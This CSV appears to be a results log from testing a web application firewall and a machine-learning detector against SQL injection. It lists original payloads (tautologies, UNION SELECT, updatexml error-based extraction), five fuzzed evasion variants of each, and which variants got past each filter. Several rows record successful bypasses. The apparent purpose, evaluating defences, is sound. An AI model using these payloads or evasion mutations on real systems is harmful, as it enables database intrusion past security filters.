Sr NO.,Original Timestamp,Payload,Original Status,WAF Status,ML Status,Combined Result,Fuzzed Payload 1,Fuzzed Timestamp 1,WAF Status 1,ML Status 1,Combined Result 1,Fuzzed Payload 2,Fuzzed Timestamp 2,WAF Status 2,ML Status 2,Combined Result 2,Fuzzed Payload 3,Fuzzed Timestamp 3,WAF Status 3,ML Status 3,Combined Result 3,Fuzzed Payload 4,Fuzzed Timestamp 4,WAF Status 4,ML Status 4,Combined Result 4,Fuzzed Payload 5,Fuzzed Timestamp 5,WAF Status 5,ML Status 5,Combined Result 5
1,2024-12-16T19:48:35.902110,1 where 7442  =  7442,403,200,200,both_incorrect,1 whERE 0x1c63=7267 /*G9+h*/	lIKE    And 1,2024-12-16T19:48:37.586658,200,200,both_incorrect,"1 WherE 0x1c63 like  OR 0 /**/
lIkE /**/  AnD 8811=0x226b",2024-12-16T19:48:40.748142,200,200,both_incorrect,7190 NOT LIKE  OR 0 WhERE 0x1c63 lIke  oR (SeLEcT 0) /**/ LikE /**/  AnD/**/8811 LIKe 0x226b,2024-12-16T19:48:44.537237,200,200,both_incorrect," AND 1 not like  oR 0 wHErE 0x1c63 like  OR (seLEct '0x1'<>'1$')
/**/ likE /**/  anD 8811 lIKe 0x226b",2024-12-16T19:48:49.939154,200,200,both_incorrect," and (SELECT 1)
not like  oR/**/0 where 0x1c63 LiKE  oR (sEleCT '0x1' not like ' OR 'R' NOT LIKE 'Ru'$')
/**/ lIKE /**/  aND 8811 Like 0x226b",2024-12-16T19:48:55.813051,200,403,waf_incorrect_ml_correct
2,2024-12-16T19:49:03.822893,1  )   as iiku where 9466  =  9466,403,403,200,waf_correct_ml_incorrect,1  )   AS iiku WHeRe 'QX%'='QX%'   like 	/**/ OR (SELECT 0),2024-12-16T19:49:05.556753,403,403,both_correct,"1  )   AS iiku/**/whERe 'QX%' Like 'QX%'   LikE 	/*[	
(SELECT (SELECT 1)) IN (2382,2383,2384)*/ oR (selEct 0)",2024-12-16T19:49:09.477821,403,403,both_correct,"1  )   As iiku/**/wHERe 'QX%' liKe 'QX%'   LiKe 	/*[	 (SELECT (SELECT 1)) IN ((SELECT 1),(SELECT 1779 LIKE 1779),2384)*/ or (seLEcT/**/0)",2024-12-16T19:49:15.728494,403,403,both_correct,"0x1  )   As iiku/**/wheRe 'QX%' likE 'QX%'   likE  /*[	 (SELECT (SELECT 1)) IN ((SELECT 1),(SELECT/**/1779 LIKE 1779),'bE+!:' LIKE 'bE+!:')*/ or (sElEct/*}*/ OR 0)",2024-12-16T19:49:23.206804,403,403,both_correct,"0x1  )   as iiku/**/WheRE 'QX%' LIkE 'QX%'   like  /*[	 (SELECT (SELECT 'R	'<>'R	$')) IN ((SELECT 1),(SELECT (SELECT  AND 1) LIKE 1779),'bE+!:' LIKE 'bE+!:')*/ Or	(SELEct/**/ || 0)",2024-12-16T19:49:32.325705,403,403,both_correct
3,2024-12-16T19:49:41.858708,prdica,200,200,200,both_correct,prdica,2024-12-16T19:49:42.293063,200,200,both_correct,prdica,2024-12-16T19:49:43.707541,200,200,both_correct,prdica,2024-12-16T19:49:45.120531,200,200,both_correct,prdica,2024-12-16T19:49:46.538051,200,200,both_correct,prdica,2024-12-16T19:49:47.955250,200,200,both_correct
4,2024-12-16T19:49:49.381550,chamberlin@nikemujeres.py,200,200,200,both_correct,chamberlin@nikemujeres.py,2024-12-16T19:49:50.686775,200,200,both_correct,chamberlin@nikemujeres.py,2024-12-16T19:49:52.945254,200,200,both_correct,chamberlin@nikemujeres.py,2024-12-16T19:49:55.237568,200,200,both_correct,chamberlin@nikemujeres.py,2024-12-16T19:49:57.529226,200,200,both_correct,chamberlin@nikemujeres.py,2024-12-16T19:49:59.831186,200,200,both_correct
5,2024-12-16T19:50:02.129873,"-4905"" union all select 6082,6082--",403,403,403,both_correct,"-(SeLEcT 1)"" union/**/all	selECT 0x17c2,'[R{Y'<>'[R{Y>'--",2024-12-16T19:50:04.112690,403,200,waf_correct_ml_incorrect,"-(selECT 8191 LIKE/**/ OR (SELECT 0))""
union/**/all	sELecT 0x17c2,'[R{Y'!='[R{Y>'--",2024-12-16T19:50:07.995166,403,403,both_correct,"-(seLeCT (sEleCT 8191) like/*t*/ oR (SELeCt  or '3'<>'3v'))""
union all
SElecT 0x17c2,'[R{Y'<>'[R{Y>'--",2024-12-16T19:50:12.980609,403,403,both_correct,"-(SeleCt (SelECT  && 'B'='B') LIke  or (seLECT	 or '0x3'<>'3v'))""
union all
sElect 0x17c2,'[R{Y'<>'[R{Y>'--",2024-12-16T19:50:18.889385,403,200,waf_correct_ml_incorrect,"-(sELEcT (SELEcT  &&/**/ AND 1<>9500) lIKe  oR (SElect  or '0x3'<>'3v'))""
union all
SELEct 0x17c2,'[R{Y'!='[R{Y>'--",2024-12-16T19:50:25.055405,403,403,both_correct
6,2024-12-16T19:50:31.704860,7uo09e5a1,200,200,200,both_correct,7uo09e5a1,2024-12-16T19:50:32.328747,200,200,both_correct,7uo09e5a1,2024-12-16T19:50:33.924223,200,200,both_correct,7uo09e5a1,2024-12-16T19:50:35.505594,200,200,both_correct,7uo09e5a1,2024-12-16T19:50:37.069321,200,200,both_correct,7uo09e5a1,2024-12-16T19:50:38.629156,200,200,both_correct
7,2024-12-16T19:50:40.208284,"1'||  (  select 'vsfg' where 3547  =  3547 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161   )    )   ||'",403,403,403,both_correct,"1'||  (  select/**/'vsfg' where 3547  =  3547 and updatexml  (  (SELECT (SELECT 1)),concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,3443 NOT LIKE 3444   )    )     )  ,0x717a767a71  )  ,1161  	)    )   ||'",2024-12-16T19:50:49.198459,403,403,both_correct,"1'||  (  select 'vsfg' where 3547  =  (SELECT 1) and updatexml  (	 (SELECT (SELECT 1)),concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  (SELECT 'Eo' LIKE 'Eo')  =  3393,3443 NOT LIKE 3444   )    )     )  ,0x717a767a71  )  ,1161  	)    )   ||'",2024-12-16T19:51:01.062683,403,403,both_correct,"0x1'||  (  select 'vsfg' where 2994<>2995  =  (SELECT 1) and updatexml  (
 (SELECT (SELECT 1)),concat /*{|SR*/(  0x2e,0x7171706a71,  (  select   (  elt  (  (SELECT 'Eo' LIKE 'Eo')  =  (SELECT 1),3443 NOT LIKE 3444   )    )     )  ,0x717a767a71  )  ,1161  	)    )   ||'",2024-12-16T19:51:13.805565,403,403,both_correct,"0x1'||  (  select 'vsfg' where 2994<>'
'<>'
i'  =  (SELECT 1) and updatexml  (
 (SELECT (SELECT  AND	1)),concat /*{|SR*/(  0x2e,0x7171706a71,  (  select   (  elt  (  (SELECT 'Eo' LIKE 'Eo')  =  (SELECT 1),3443 NOT LIKE 0xd74   )    )     )  ,0x717a767a71  )  ,1161  	)    ) /**/ ||'",2024-12-16T19:51:27.711104,403,403,both_correct,"0x1'||  (  select 'vsfg' where 2994<>'
'<>'
i'  =  (SELECT 1) and updatexml  (
 (SELECT (SELECT 	AND	0x1)),concat /*{|SR*/(  0x2e,0x7171706a71,  (  select   (  elt  (  (SELECT 'Eo' LIKE 'Eo')  =  (SELECT 1), OR 0 NOT LIKE 7651 NOT LIKE 0xd74   )    )     )  ,0x717a767a71  )  ,1161 /**/	)    ) /*\w0A*/ ||'",2024-12-16T19:51:42.012519,403,403,both_correct
8,2024-12-16T19:51:57.728112,wicht,200,200,200,both_correct,wicht,2024-12-16T19:51:58.105524,200,200,both_correct,wicht,2024-12-16T19:51:59.468439,200,200,both_correct,wicht,2024-12-16T19:52:00.832229,200,200,both_correct,wicht,2024-12-16T19:52:02.195874,200,200,both_correct,wicht,2024-12-16T19:52:03.568502,200,200,both_correct
9,2024-12-16T19:52:04.941771,kallewar,200,200,200,both_correct,kallewar,2024-12-16T19:52:05.441723,200,200,both_correct,kallewar,2024-12-16T19:52:06.953661,200,200,both_correct,kallewar,2024-12-16T19:52:08.439329,200,200,both_correct,kallewar,2024-12-16T19:52:09.952953,200,200,both_correct,kallewar,2024-12-16T19:52:11.477901,200,200,both_correct
10,2024-12-16T19:52:12.996960,byoungin,200,200,200,both_correct,byoungin,2024-12-16T19:52:13.509825,200,200,both_correct,byoungin,2024-12-16T19:52:15.017348,200,200,both_correct,byoungin,2024-12-16T19:52:16.513256,200,200,both_correct,byoungin,2024-12-16T19:52:18.017737,200,200,both_correct,byoungin,2024-12-16T19:52:19.526483,200,200,both_correct
